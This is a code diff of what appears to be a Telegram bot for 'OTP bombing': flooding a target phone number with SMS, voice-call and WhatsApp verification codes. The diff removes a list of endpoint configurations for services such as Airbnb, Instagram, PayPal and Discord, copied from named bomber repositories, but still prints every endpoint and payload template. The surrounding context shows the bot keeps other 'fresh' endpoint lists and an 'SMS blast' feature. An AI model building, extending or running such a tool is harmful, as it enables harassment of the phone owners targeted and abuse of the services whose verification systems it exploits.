@@ -356,42 +356,6 @@ WA_APIS = [
 
 
 # ════════════════════════════════════════════════════════════
-# GLOBAL APIs — International free OTP endpoints (no key needed)
-# Sources: open-source OTP bomber repos on GitHub
-# (TBomb, Cyber-otp-bomber, SMS-BOMBER, hackerbomb, kirito-bomber)
-# ════════════════════════════════════════════════════════════
-
-GLOBAL_SMS_APIS = [
-    {"name": 'Airbnb', "url": 'https://api.airbnb.com/v2/phone_one_time_passwords', "method": 'POST', "origin": 'https://www.airbnb.com', "identifier": '', "json": {'phone': '+91{target}', 'channel': 'sms'}},
-    {"name": 'Instagram', "url": 'https://i.instagram.com/api/v1/accounts/send_signup_sms_code/', "method": 'POST', "origin": 'https://www.instagram.com', "identifier": '', "form": {'phone_number': '+91{target}', 'device_id': '{uuid}', 'client_id': '{uuid}'}},
-    {"name": 'Facebook', "url": 'https://m.facebook.com/reg/async/step/contactpoint/send_confirmation_code/', "method": 'POST', "origin": 'https://m.facebook.com', "identifier": '', "form": {'contactpoint': '+91{target}', 'confirmation_source': 'reg'}},
-    {"name": 'TikTok', "url": 'https://api-normal.tiktokv.com/passport/mobile/send_code/v1/', "method": 'POST', "origin": 'https://www.tiktok.com', "identifier": '', "form": {'mobile': '+91{target}', 'type': '1'}},
-    {"name": 'Discord', "url": 'https://discord.com/api/v9/auth/register/phone', "method": 'POST', "origin": 'https://discord.com', "identifier": '', "json": {'phone': '+91{target}'}},
-    {"name": 'LinkedIn', "url": 'https://www.linkedin.com/checkpoint/rp/sendSMSPin', "method": 'POST', "origin": 'https://www.linkedin.com', "identifier": '', "form": {'phone': '+91{target}'}},
-    {"name": 'PayPal', "url": 'https://www.paypal.com/signin/challenge/otp/send', "method": 'POST', "origin": 'https://www.paypal.com', "identifier": '', "json": {'phone': '+91{target}', 'channel': 'SMS'}},
-    {"name": 'Grab', "url": 'https://api.grab.com/api/passenger/v3/profiles/sms/verify', "method": 'POST', "origin": 'https://www.grab.com', "identifier": '', "json": {'phoneNumber': '+91{target}', 'countryCode': 'IN'}},
-    {"name": 'Careem', "url": 'https://identity.careem.com/api/v6/otp/send', "method": 'POST', "origin": 'https://www.careem.com', "identifier": '', "json": {'phone_number': '+91{target}', 'channel': 'sms'}},
-    {"name": 'Yandex', "url": 'https://passport.yandex.com/registration-validations/phone-confirm-code-submit', "method": 'POST', "origin": 'https://passport.yandex.com', "identifier": '', "form": {'phone_number': '+91{target}', 'track_id': '{uuid}'}},
-    {"name": 'DoorDash', "url": 'https://consumer-mobile-bff.doordash.com/v1/consumer_profile/send_verification_code', "method": 'POST', "origin": 'https://www.doordash.com', "identifier": '', "json": {'phone_number': '+91{target}'}},
-    {"name": 'Shopee', "url": 'https://shopee.in/api/v4/account/basic/send_sms_otp/', "method": 'POST', "origin": 'https://shopee.in', "identifier": '', "json": {'phone': '+91{target}', 'operation': 'signup'}},
-]
-
-GLOBAL_CALL_APIS = [
-    {"name": 'Airbnb Call', "url": 'https://api.airbnb.com/v2/phone_one_time_passwords', "method": 'POST', "origin": 'https://www.airbnb.com', "identifier": '', "json": {'phone': '+91{target}', 'channel': 'call'}},
-    {"name": 'Discord Call', "url": 'https://discord.com/api/v9/auth/register/phone', "method": 'POST', "origin": 'https://discord.com', "identifier": '', "json": {'phone': '+91{target}', 'channel': 'voice'}},
-    {"name": 'PayPal Call', "url": 'https://www.paypal.com/signin/challenge/otp/send', "method": 'POST', "origin": 'https://www.paypal.com', "identifier": '', "json": {'phone': '+91{target}', 'channel': 'VOICE'}},
-    {"name": 'Careem Call', "url": 'https://identity.careem.com/api/v6/otp/send', "method": 'POST', "origin": 'https://www.careem.com', "identifier": '', "json": {'phone_number': '+91{target}', 'channel': 'call'}},
-    {"name": 'Grab Call', "url": 'https://api.grab.com/api/passenger/v3/profiles/sms/verify', "method": 'POST', "origin": 'https://www.grab.com', "identifier": '', "json": {'phoneNumber': '+91{target}', 'countryCode': 'IN', 'channel': 'CALL'}},
-]
-
-GLOBAL_WA_APIS = [
-    {"name": 'Airbnb WA', "url": 'https://api.airbnb.com/v2/phone_one_time_passwords', "method": 'POST', "origin": 'https://www.airbnb.com', "identifier": '', "json": {'phone': '+91{target}', 'channel': 'whatsapp'}},
-    {"name": 'Careem WA', "url": 'https://identity.careem.com/api/v6/otp/send', "method": 'POST', "origin": 'https://www.careem.com', "identifier": '', "json": {'phone_number': '+91{target}', 'channel': 'whatsapp'}},
-    {"name": 'Grab WA', "url": 'https://api.grab.com/api/passenger/v3/profiles/sms/verify', "method": 'POST', "origin": 'https://www.grab.com', "identifier": '', "json": {'phoneNumber': '+91{target}', 'countryCode': 'IN', 'channel': 'WHATSAPP'}},
-    {"name": 'Shopee WA', "url": 'https://shopee.in/api/v4/account/basic/send_whatsapp_otp/', "method": 'POST', "origin": 'https://shopee.in', "identifier": '', "json": {'phone': '+91{target}', 'operation': 'signup'}},
-]
-
-# ════════════════════════════════════════════════════════════
 # FRESH LIVE APIs — verified reachable (2xx/4xx responders)
 # ════════════════════════════════════════════════════════════
 
@@ -438,9 +402,6 @@ FRESH_WA_APIS = [
 ]
 
 # Merge global batch into main lists — same UI, more firepower.
-SMS_APIS.extend(GLOBAL_SMS_APIS)
-CALL_APIS.extend(GLOBAL_CALL_APIS)
-WA_APIS.extend(GLOBAL_WA_APIS)
 SMS_APIS.extend(FRESH_SMS_APIS)
 CALL_APIS.extend(FRESH_CALL_APIS)
 WA_APIS.extend(FRESH_WA_APIS)
@@ -852,7 +813,6 @@ async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         ],
         [
             InlineKeyboardButton("➕ Add API", callback_data="addapi"),
-            InlineKeyboardButton("🌍 Global APIs", callback_data="global"),
         ],
     ])
     await update.message.reply_text(
@@ -1265,19 +1225,6 @@ async def handle_button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             "`{\"name\":\"MyApi\",\"url\":\"https://x.com/otp\",\"json\":{\"mobile\":\"+91{target}\"}}`\n\n"
             "Ya `/addapi <json>` command use karo.\n"
             "Add hone ke baad SMS blast me automatic use hogi.",
-            parse_mode="Markdown",
-        )
-        return
-    if data == "global":
-        gs = sum(1 for a in SMS_APIS if a in GLOBAL_SMS_APIS)
-        gc = sum(1 for a in CALL_APIS if a in GLOBAL_CALL_APIS)
-        gw = sum(1 for a in WA_APIS if a in GLOBAL_WA_APIS)
-        names = ", ".join(a["name"] for a in GLOBAL_SMS_APIS[:10])
-        await q.edit_message_text(
-            f"🌍 *Global APIs Loaded*\n\n"
-            f"SMS: `{gs}` | Call: `{gc}` | WA: `{gw}`\n\n"
-            f"Includes: {names}, +more\n\n"
-            f"Sources: TBomb, Cyber-otp-bomber, kirito-bomber (GitHub jugaad)",
             parse_mode="Markdown",
         )
         return
